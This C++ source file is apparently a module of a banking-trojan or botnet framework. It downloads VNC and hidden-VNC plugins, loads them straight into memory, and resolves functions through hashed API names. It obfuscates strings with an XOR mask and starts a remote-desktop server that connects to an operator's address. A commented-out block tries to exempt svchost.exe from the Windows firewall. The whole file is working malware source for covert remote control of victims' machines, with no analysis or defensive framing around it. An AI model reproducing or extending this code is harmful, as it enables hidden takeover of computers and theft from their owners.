#include "other.h"
#include "Manager.h"
#include "sandbox.h"
#include "main.h"
#include "tools.h"
#include "errors.h"
#include "core\pipe.h"
#include "core\runinmem.h"
#include "core\crypt.h"
#include "core\file.h"
#include "core\version.h"

namespace VNC
{

//отключает предупреждение на массив нулевого размера
#pragma warning ( disable : 4200 )
struct Params
{
	typeFuncRes funcRes; //адрес функции которая вызывается для оповещения результата работы
	AddressIpPort ipp; //порт который должен открыть плагин для подключения
	char answerPipe[32]; //имя канала которому нужно отправить ответ
	Pipe::typeReceiverPipeAnswer func; //которой нужно передать ответ
	int size_x86; //размер плагина версии x86
	int size_x64; //размер плагина версии x64
	int c_tag; 
	byte data[0]; //тело плагина x86, а за ним следом плагина x64, далее tag
};

struct VNCDLL_CONTEXT
{
	ULONGLONG	pModule32;	// указатель на загруженный в память файл, содержащий 32х-битную версию DLL
	ULONGLONG	pModule64;	// указатель на загруженный в память файл, содержащий 64х-битную версию DLL
	ULONG		Module32Size;	// размер файла 32х-битной DLL
	ULONG		Module64Size;	// размер файла 64х-битной DLL
};

struct FuncPort
{
	typeFuncRes funcRes;
	char namePlugin_x64[32];
	AddressIpPort ipp;
	byte* data; //загруженный плагин x86
	int sz_data;
	void* tag;
	int c_tag;
};

typedef ULONG (WINAPI *typeStartServer)( PVOID* pServerHandle, SOCKADDR_IN* ServerAddress, LPTSTR pClientId, BOOL bWaitConnect );
typedef	void (WINAPI *typeStopServer)( PVOID ServerHandle );


class VNCServer : public PipeServer
{
		typeStartServer StartServer;
		typeStopServer StopServer;
		PVOID server;

		//virtual int Handler( Pipe::Msg* msgIn, void** msgOut );
		virtual void Disconnect();

	public:

		VNCServer( typeStartServer _StartServer, typeStopServer _StopServer, PVOID _server ) :
			StartServer(_StartServer), StopServer(_StopServer), server(_server)
		{
		}
		~VNCServer();

};

DWORD WINAPI ThreadVNC( void* );

StringBuilder& GetNameVNCServer( StringBuilder& s )
{
	return Crypt::Name( _CS_("VNCServer"), Config::XorMask, s );
}

static void HandlerStartInSandbox( Pipe::AutoMsg msg, DWORD tag )
{
	int res = *((int*)msg->data);
	((typeFuncRes)tag)(res);
}

static void HandlerLoadedPlugin( Pipe::AutoMsg msg, DWORD tag )
{
	FuncPort* fp = (FuncPort*)tag;
	if( msg->sz_data > 20000 )
	{
		byte *x86 = 0, *x64 = 0;
		int sz_x86 = 0, sz_x64 = 0;
		if( fp->data == 0 ) //загрузили x86 версию плагина
		{
			DbgMsg( "Загрузили vnc x86 плагин (%d)", fp->sz_data );
			if( fp->namePlugin_x64[0] ) //указано имя плагина x64
			{
				WindowsVersion wv;
				GetWindowsVersion(wv);
				if( wv.architecture == Sys64bit ) //x64 версия ОС
				{
					//для версии винды x64 добавляем свцхост в исключения, чтобы не срабатывал брандмаузер
					//StringBuilderStack<MAX_PATH> svchost;
					//if( Path::GetCSIDLPath( CSIDL_WINDOWS, svchost, _CS_("SysWOW64") ) ) 
					//{
					//	Path::AppendFile( svchost, _CS_("svchost.exe" ) );
					//	AddAllowedprogram(svchost);
					//}

					fp->data = (byte*)Mem::Duplication( msg->data, msg->sz_data );
					fp->sz_data = msg->sz_data;
					StringBuilder name( 0, -1, fp->namePlugin_x64 );
					ManagerServer::LoadPlugin( name, HandlerLoadedPlugin, 0, (DWORD)fp ); //загружаем x64 версию
					return;
				}
			}
			x86 = msg->data; sz_x86 = msg->sz_data;
		}
		else //загрузили x64 версию плагина
		{
			DbgMsg( "Загрузили vnc x64 плагин" );
			x86 = fp->data;	sz_x86 = fp->sz_data;
			x64 = (byte*)msg->data;	sz_x64 = msg->sz_data;
		}
		int sz_param = sizeof(Params) + sz_x86 + sz_x64 + fp->c_tag;
		Params* param = (Params*)Mem::Alloc(sz_param);
		if( param == 0 )
			fp->funcRes(2);
		else
		{
			param->funcRes = fp->funcRes;
			param->ipp = fp->ipp;
			Str::Copy( param->answerPipe, sizeof(param->answerPipe), Pipe::serverPipeResponse->GetName() );
			param->func = HandlerStartInSandbox;
			param->size_x86 = sz_x86;
			param->size_x64 = sz_x64;
			param->c_tag = fp->c_tag;
			Mem::Copy( param->data, x86, sz_x86 );
			Mem::Copy( param->data + sz_x86, x64, sz_x64 );
			Mem::Copy( param->data + sz_x86 + sz_x64, fp->tag, fp->c_tag );
			Sandbox::Run( ThreadVNC, MAIN_USER, param, sz_param, false );
		}
	}
	else
		fp->funcRes(1);
	Mem::Free(fp->data);
	Mem::Free(fp->tag);
	Mem::Free(fp);
}

bool Start( const char* namePlugin, const char* namePlugin_x64, AddressIpPort& ipp, typeFuncRes func, void* tag, int c_tag )
{
	StringBuilder name( 0, -1, namePlugin );
	FuncPort* fp = (FuncPort*)Mem::Alloc(sizeof(FuncPort));
	if( fp )
	{
		Mem::Set( fp, 0, sizeof(FuncPort) );
		fp->funcRes = func;
		Str::Copy( fp->namePlugin_x64, sizeof(fp->namePlugin_x64), namePlugin_x64 );
		fp->ipp = ipp;
		fp->tag = tag;
		fp->c_tag = c_tag;
		return ManagerServer::LoadPlugin( name, HandlerLoadedPlugin, 0, (DWORD)fp );
	}
	func(2);
	return false;
}

static void ResStartVNC( int res )
{
	DbgMsg( "Результат старта vnc.plug: %d", res );
	int err = TaskErr::Wrong;
	switch( res )
	{
		case 0: err = TaskErr::Succesfully; break;
		case 1: err = TaskErr::PluginNotLoad; break;
		case 2: err = TaskErr::OutOfMemory; break;
		case 3: err = TaskErr::NotRunInMem; break;
		case 4: err = TaskErr::NotExportFunc; break;
	}
	StringBuilderStack<8> cmd;
	cmd = _CS_("vnc");
	ManagerServer::SendResExecutedCmd( cmd, err );
}

bool StartDefault( AddressIpPort& port, bool hvnc, void* tag, int c_tag )
{
	if( hvnc )
		Start( _CS_("hvnc.plug"), _CS_("hvnc64.plug"), port, ResStartVNC, tag, c_tag );
	else
		Start( _CS_("vnc.plug"), _CS_("vnc64.plug"), port, ResStartVNC, tag, c_tag );
	return true;
}


DWORD WINAPI ThreadVNC( void* )
{
	Params* param = (Params*)Sandbox::Init();
	Socket::Init();
	VNCDLL_CONTEXT context;
	context.pModule32 = (ULONGLONG)param->data;
	context.pModule64 = (ULONGLONG)(param->data + param->size_x86);
	context.Module32Size = param->size_x86;
	context.Module64Size = param->size_x64;
	int res = 0;
#ifdef WIN64
	HMODULE dll = RunInMem::RunDll( param->data + param->size_x86, param->size_x64, &context );
#else
	HMODULE dll = RunInMem::RunDll( param->data, param->size_x86, &context );
#endif
	if( dll )
	{
		typeStartServer StartServer = (typeStartServer)WinAPI::GetApiAddr( dll, 0x0d163182 /*VncStartServer*/ );
		typeStopServer StopServer = (typeStopServer)WinAPI::GetApiAddr( dll, 0x08d437f2 /*VncStopServer*/ );
		if( StartServer && StopServer )
		{
			SOCKADDR_IN	addr;
			PVOID server;

			addr.sin_family = AF_INET;
			DbgMsg( "VNC порт %s:%d", param->ipp.ip, param->ipp.port );
			addr.sin_port = API(WS2_32, htons)(param->ipp.port);
			addr.sin_addr.S_un.S_addr = API(WS2_32, inet_addr)(param->ipp.ip);
			if( addr.sin_addr.S_un.S_addr == INADDR_NONE ) addr.sin_addr.S_un.S_addr = 0;
			char* clientId = 0;
			char* sendData = 0;
			if( param->c_tag > 0 )
			{
				sendData = (char*)param->data + param->size_x86 + param->size_x64;
			}
			else
			{
				clientId = DECODE_STRING2(_CT_("222289DD-9234-C9CA-94E3-E60D08C77777"));
				sendData = clientId;
			}
			if( (StartServer( &server, &addr, sendData, TRUE) ) == NO_ERROR )
			{
				VNCServer* vnc = new VNCServer( StartServer, StopServer, server );
				StringBuilderStack<32> name;
				vnc->SetName( GetNameVNCServer(name) );
				vnc->StartAsync();
			}
			else
				res = 5;
			Str::Free(clientId);
		}
		else
			res = 4;
	}
	else
		res = 3;
	PipeClient::Send( param->answerPipe, 0, &res, sizeof(res), 0, param->func, (DWORD)param->funcRes );
	if( res )
		API(KERNEL32, ExitProcess)(0);
	return 0;
}

void VNCServer::Disconnect()
{
	DbgMsg( "VNC сервер остановлен" );
	StopServer(server);
	Delay(2000);
	API(KERNEL32, ExitProcess)(0);
}

}
